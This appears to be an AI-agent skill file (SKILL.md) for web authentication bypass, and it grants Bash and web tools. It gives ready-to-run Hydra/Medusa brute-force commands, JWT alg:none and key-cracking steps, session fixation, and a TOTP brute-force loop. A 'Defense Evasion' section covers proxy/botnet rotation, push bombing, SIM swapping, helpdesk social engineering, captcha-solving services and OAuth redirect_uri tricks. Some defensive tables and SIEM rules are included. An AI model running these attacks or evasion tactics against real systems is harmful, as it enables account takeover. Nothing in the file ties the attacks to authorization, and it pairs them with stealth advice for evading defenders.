---
name: web-auth-bypass
description: "Authentication Bypass refers to attackers exploiting design flaws or implementation vulnerabilities in authentication mechanisms to bypass the normal authentication process and gain unauthorized access."
origin: openclaw
version: "0.2.0.2"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: web-attack
  tool_count: 5
  guide_count: 5
  owasp: "A07:2021-Identification"
  last_reviewed: "2026-09-04"
---




# Skill: Authentication Bypass

> **Supplementary Files**:
> - `payloads.md` — Payload collection organized by 8 major attack types (username enumeration, brute force, JWT, session, MFA, OAuth, password reset)
> - `test-cases.md` — Structured test case templates (17 cases covering enumeration, brute force, JWT, session, MFA, OAuth — 6 categories)
> - `auth-bypass-guide.md` — Complete guide to authentication failures (password policy bypass, credential stuffing, session management, complete offensive and defensive code examples for MFA bypass)

## Summary

Web Auth Bypass skill domain covering web attack operations.

**Tools**: Burp Suite, Hydra, Medusa, jwt_tool, Hashcat

**Domain**: web-attack

**OWASP**: A07:2021-Identification

## Description

Authentication Bypass refers to attackers exploiting design flaws or implementation vulnerabilities in authentication mechanisms to bypass the normal authentication process and gain unauthorized access. These attacks fall under OWASP Top 10 A07: Identification and Authentication Failures, and represent one of the most destructive attack categories in web security.

**Core Attack Surfaces**:

- **Broken Authentication**: Weak password policies, unchanged default credentials, authentication logic errors allowing permission checks to be skipped.
- **Session Management Flaws**: Predictable session IDs, session fixation, missing session timeouts, improperly configured cookie attributes (missing `HttpOnly` / `Secure` / `SameSite`).
- **Credential Stuffing**: Using username/password combinations exposed in other data breaches to automate bulk login attempts against a target site.
- **MFA Bypass**: Flaws in MFA implementation logic (direct authorization after password verification without enforcing secondary verification), reset process bypass, backup authentication channel abuse, TOTP brute force.
- **JWT Attacks**: Algorithm confusion (`alg: none`), key brute force, signature bypass, payload tampering, `jku`/`x5u` header injection.

**Advanced Technique Dimensions**: Race condition bypassing rate limiting, OAuth flow hijacking, SAML injection, password reset token predictability analysis, API authentication bypass (IDOR + authentication combined exploitation).

---

## Use Cases

1. **Web Application Penetration Testing**: Systematically enumerate authentication endpoints (Login / Register / Reset Password / MFA Verify), analyze authentication flow logic, identify bypassable steps.
2. **Credential Security Assessment**: Test password policy strength, detect default credentials, verify effectiveness of account lockout mechanisms and rate limiting.
3. **Session Management Audit**: Check session ID generation entropy, cookie security attributes, session lifecycle management, concurrent session control.
4. **JWT Security Testing**: Analyze token structure, verify signature algorithm security, detect common JWT vulnerabilities (alg:none / weak key / jku injection).
5. **MFA Implementation Audit**: Verify whether MFA is enforced for all sensitive operations, detect if secondary authentication can be skipped, assess TOTP/SMS security.

---

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Burp Suite** | Proxy interception, authentication flow analysis, session tracking, Intruder brute force, Comparer for response diff analysis | Proxy intercept Login request -> Intruder set Payload -> Analyze response length/status code differences |
| **Hydra** | High-speed online brute force, supports SSH / HTTP / FTP / SMB and many other protocols | `hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |
| **Medusa** | Parallel login brute force, supports multi-threaded multi-protocol bulk testing | `medusa -h target.com -u admin -P passwords.txt -M http -m FORM:/login -m FORM-DATA:"user=?&pass=?"` |
| **jwt_tool** | JWT security testing: algorithm confusion, signature bypass, payload tampering, key brute force | `python3 jwt_tool.py <JWT> -T` (interactive tampering) / `python3 jwt_tool.py <JWT> -X a` (alg:none) |
| **Hashcat** | Offline password hash cracking, JWT key brute force (mode 16500) | `hashcat -m 16500 jwt_token.txt wordlist.txt` (HS256 key brute force) |

Auxiliary tools: **Burp AuthMatrix** (permission matrix testing), **Cookie Editor** (cookie attribute analysis), **ffuf** (username enumeration), **SecLists** (dictionary collections).

### Tool Installation Instructions

| Tool | Built into Kali | Installation Method |
|------|----------------|---------------------|
| Burp Suite | Community edition built-in | Launch with `burpsuite` |
| Hydra | Built-in | `hydra` |
| Medusa | Built-in | `medusa` |
| Hashcat | Built-in | `hashcat` |
| jwt_tool | **Not built-in** | `git clone https://github.com/ticarpi/jwt_tool.git && cd jwt_tool && pip3 install pycryptodomex termcolor cprint` |

---

## Methodology

### Attack Chain

```
[1] Authentication         [2] Credential           [3] Session Management
    Mechanism Identification   Attacks                    Analysis
  - Login endpoint           - Default credential        - Session ID entropy analysis
    enumeration                 testing                  - Cookie security attribute check
  - Authentication flow      - Username enumeration      - Session fixation testing
    mapping                  - Brute force (Hydra)       - Session timeout verification
  - API authentication       - Credential stuffing
    method identification
  - OAuth/JWT identification
       |                       |                       |
       v                       v                       v
[4] Token/JWT Analysis     [5] MFA Bypass            [6] Privilege Escalation
  - alg:none testing         - MFA enforcement          - Horizontal privilege
  - Key brute force            verification               escalation (IDOR)
  - Payload tampering        - Direct access bypass     - Vertical privilege
  - jku/x5u injection       - Reset process bypass       escalation
                             - TOTP brute force         - Role switching
                                                        - API unauthorized access
```

### Defense Perspective

| Defense Layer | Measures | Key Points |
|---------------|----------|------------|
| **Password Policy** | Minimum 12 characters + mixed case + digits + special characters + common password blacklist | See `guides/authentication_failures_complete_guide.md` Section 2 |
| **Rate Limiting** | Progressive delays + account lockout + IP blocking + CAPTCHA | Key measure for defending against brute force and credential stuffing |
| **Session Management** | Regenerate session ID after login + secure cookie attributes + reasonable timeout | `HttpOnly; Secure; SameSite=Strict` trio — all three are essential |
| **MFA Enforcement** | Set `partial_auth` after password verification, only set `authenticated` after MFA passes | See guide Section 5 for secure MFA implementation patterns |
| **JWT Best Practices** | Enforce algorithm allowlist + strong keys + short expiration + token blacklist | Prohibit `alg: none`, use RS256 instead of HS256 |
| **Login Monitoring** | Anomalous login alerts + device fingerprinting + geolocation + login notifications | Combine with automated detection tools for continuous monitoring |

---

## Practical Steps

> **For detailed payloads see `payloads.md`, and for the complete test checklist see `test-cases.md`.** Below is a summary of core operations for each phase.

### 1. Username Enumeration

```
# Enumerate valid usernames via response differences
curl -s -d "user=admin&pass=wrong" http://target.com/login | grep -o "Incorrect password"
curl -s -d "user=nonexistent&pass=wrong" http://target.com/login | grep -o "User not found"

# ffuf bulk enumeration
ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
     -d "user=FUZZ&pass=test123" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.com/login \
     -fr "User not found"
```

### 2. Brute Force

```bash
# Hydra - HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      target.com http-post-form \
      "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# Hydra - Specify threads and port
hydra -L users.txt -P passwords.txt -t 10 -s 8080 \
      target.com http-post-form \
      "/auth/login:user=^USER^&pass=^PASS^:S=302"

# Medusa - Parallel multi-protocol brute force
medusa -h target.com -U users.txt -P passwords.txt \
       -M http -m FORM:/login -m FORM-DATA:"POST:user=?&password=?"
```

### 3. JWT Attacks

```bash
# jwt_tool - Interactive analysis
python3 jwt_tool.py <TOKEN> -T

# alg:none attack
python3 jwt_tool.py <TOKEN> -X a

# Key brute force (HS256)
echo "<JWT_TOKEN>" > jwt_hash.txt
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# Payload tampering -- Modify user field then re-sign
python3 jwt_tool.py <TOKEN> -I -pc user -pv admin -S hs256 -p "secret_key"
```

### 4. Session Management Attacks

```
# Session ID predictability testing -- Collect session IDs across multiple logins
for i in $(seq 1 10); do
    curl -s -c - -d "user=test&pass=test" http://target.com/login | grep session
done
# Analyze patterns: sequential? timestamp? base64(user:timestamp)?

# Session fixation attack
# 1. Construct a fixed session ID
# 2. Trick the victim into logging in with that session ID
# 3. Attacker uses the same session ID to access authenticated resources
curl -s -b "session=attacker_fixed_id" http://target.com/login \
     -d "user=victim&pass=victimpass"
curl -s -b "session=attacker_fixed_id" http://target.com/admin/profile
```

### 5. Cookie Security Attribute Check

```
# Check Set-Cookie header security attributes
curl -v http://target.com/login 2>&1 | grep -i "set-cookie"
# Red flags:
#   - Missing HttpOnly -> JavaScript can read session tokens
#   - Missing Secure  -> Cookie transmitted in plaintext over HTTP
#   - Missing SameSite -> Vulnerable to CSRF attacks
```

### 6. MFA Bypass Techniques

```
# Technique 1: Direct access bypass -- MFA not enforced after password verification
curl -s -c cookies.txt -d "user=admin&pass=admin123" http://target.com/login
curl -s -b cookies.txt http://target.com/admin/dashboard  # Bypass MFA page

# Technique 2: Response tampering -- Burp intercept /verify-mfa response
# Change {"success":false} to {"success":true}

# Technique 3: TOTP brute force -- Enumerate 6-digit codes when no rate limiting
for code in $(seq 000000 999999); do
    curl -s -d "code=$code" http://target.com/verify-mfa | grep -q "success" \
         && echo "[+] Code: $code" && break
done

# Technique 4: Password reset process bypass -- MFA may be temporarily disabled after reset
curl -s -d "email=admin@target.com" http://target.com/reset-password
# Obtain reset link -> Reset password -> Direct login (MFA may have been reset)
```

---

## Detection Methods

Authentication bypass detection combines behavioral anomaly analysis, rate-based rules, and protocol-level validation. Understanding detection signals helps testers operate more stealthily and helps defenders prioritize monitoring.

### Authentication Server Indicators
- **Geographic anomalies**: Login from new country / continent; impossible travel (login from US + China within 1h).
- **Velocity patterns**: >5 failed logins from same IP in 1 min (brute force); 100+ successful logins from same IP (credential stuffing).
- **Time anomalies**: Off-hours admin logins (3 AM on weekend); logins outside user's typical window.
- **User-agent anomalies**: Login with curl/python-requests when user typically uses Chrome/Safari.
- **Session anomalies**: Multiple concurrent sessions for same user from different IPs.

### Token & Cookie Indicators
- **JWT manipulation**: Multiple `kid` header values; algorithm switching (`alg` parameter changes across requests); expired tokens passing validation.
- **Session fixation**: Same session ID before and after login (server not rotating on auth).
- **Cookie tampering**: Decoded cookie values show role escalation (`user` → `admin`); signature bypass attempts.
- **Refresh token abuse**: Refresh tokens used past revocation; multiple access tokens from one refresh.

### Account-Level Indicators
- **Password reset floods**: Reset emails triggered for many accounts in short window (account enumeration).
- **MFA fatigue**: Multiple MFA push notifications in short window (push bombing).
- **Dormant account activation**: Long-inactive accounts suddenly active with new IP / device fingerprint.
- **Privilege anomaly**: Regular user suddenly accessing admin endpoints; role change without admin action.

### SIEM Detection Rules
- **Splunk SPL**: `index=auth action=failure | stats count by src_ip user | where count > 5`
- **Sigma rule**: `sigma/rules/auth/impossible_travel.yml` — detects logins from geographically distant IPs within implausible time.
- **Sigma rule**: `sigma/rules/auth/brute_force.yml` — detects >10 failures in 5 min.
- **Sigma rule**: `sigma/rules/auth/mfa_fatigue.yml` — detects >5 MFA challenges in 1 min.
- **JWT validation**: Reject tokens with `alg: none` or missing signature; log all rejected tokens.
- **Velociraptor / Wazuh**: Account lockout events correlated with successful login (lockout bypass).

## Defense Evasion Techniques

### Brute Force Evasion
- **Low & slow**: Pace attempts below lockout threshold (e.g., 2 attempts/min/IP); use jitter.
- **IP rotation**: Distribute attempts across residential proxies / botnet / Tor (3 attempts per IP then rotate).
- **User rotation**: Spread attempts across many usernames (1 attempt per user, then cycle back after cooldown).
- **Account lockout bypass**: Trigger lockout, then use password reset flow to bypass; or use valid credentials from breach corpus.
- **Time delay**: Wait 15+ min between attempts to avoid sliding-window rate limits.

### Credential Stuffing Stealth
- **Reverse proxy chains**: Use residential proxies (Bright Data, Smartproxy) to mimic real user IPs.
- **Browser fingerprint matching**: Use Playwright / Selenium with realistic fingerprints (Canvas, WebGL, fonts).
- **TLS fingerprinting**: Use `curl-impersonate` to mimic browser TLS handshake (JA3 hash match).
- **Captcha bypass**: Use 2Captcha / Anti-Captcha services for automated solving; or train ML model on the specific captcha.
- **Mobile API abuse**: Use mobile app's API endpoint which often has weaker rate limiting than web.

### MFA Bypass Techniques
- **Push bombing**: Send many MFA push notifications until user fatigues and approves (target off-hours).
- **SIM swap**: Social engineer mobile carrier to port victim's number to attacker-controlled SIM.
- **MFA fatigue + helpdesk**: Trigger MFA fatigue, then call helpdesk claiming "lost phone" to reset MFA.
- **OAuth abuse**: Use `prompt=none` or `max_age=0` to skip MFA re-prompt in OIDC flows.
- **Session token theft**: Steal post-MFA session cookie via XSS / MITM / malware (bypasses MFA entirely).
- **Code brute force**: Brute force 6-digit TOTP codes (1M possibilities; bypass if no rate limit).

### OAuth / OIDC Evasion
- **redirect_uri bypass**: Test variations (`https://app.example.com` vs `https://app.example.com.evil.com`).
- **state parameter reuse**: Replay legitimate state across multiple OAuth flows.
- **PKCE downgrade**: Try removing `code_challenge` to force fallback to implicit flow.
- **Token leakage via referrer**: Initiate OAuth flow from page that leaks `code` via Referer header.
- **Open redirect chain**: Use open redirect on legitimate domain to forward OAuth code to attacker.

### Session Hijacking Stealth
- **Cookieless session**: Pass session ID in URL parameter (some legacy apps); disappears from server logs.
- **WebSocket session use**: Use WebSocket connection to maintain session without periodic HTTP requests.
- **Session fixation via subdomain**: Set session cookie via vulnerable subdomain (cookie scope escalation).
- **Concurrent session use**: Use stolen session from different geographic region during user's typical off-hours.
- **Proxy Pivot**: Route session traffic through victim's geographic region (residential proxy in same city).

---

## Hacker Laws

- **Trust but Verify**: Do not trust the apparent security of authentication mechanisms. Even if a system claims to use MFA, you must verify whether it is enforced across all sensitive paths. Guide Section 5 demonstrates multiple MFA implementation flaw cases.
- **The Weakest Link Is Human**: Credential stuffing depends on users reusing passwords across sites. Weak passwords (123456 / password / admin) consistently top leaked password rankings. Security awareness training and password manager promotion are equally important.
- **Minimize Attack Surface**: Reduce authentication endpoint exposure, unify authentication entry points, and eliminate redundant login channels. Every additional endpoint (API / Mobile SSO / OAuth Callback) is a potential bypass point.
- **Murphy's Security Law**: If a logic flaw exists in the authentication process, attackers will find and exploit it. `alg:none` JWTs, non-regenerated session IDs, skippable MFA — these issues are not "might be" but "will be" discovered.

---

## Learning Resources

**Supplementary files for this skill**:
- `payloads.md` — Complete payload collection (8 major attack types, ready to copy and use)
- `test-cases.md` — Structured test cases (17 case templates with preconditions and expected results)
- `auth-bypass-guide.md` — Complete guide to authentication failures (offensive and defensive code examples)

**Related skills**:
- `skills/api-security/SKILL.md` — API security testing (authentication dimension in JWT/BOLA testing)
- `skills/web-access-control/SKILL.md` — Access control (IDOR/privilege escalation complementary to authentication bypass)

**External resources**:
- **PortSwigger Web Security Academy - Authentication**: https://portswigger.net/web-security/authentication (Systematic labs: Brute Force / Bypass / MFA / JWT)
- **OWASP Authentication Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **JWT.io Debugger**: https://jwt.io/ (Online JWT token decoding and analysis)
- **SecLists Passwords**: https://github.com/danielmiessler/SecLists/tree/master/Passwords (Brute force dictionary collections)
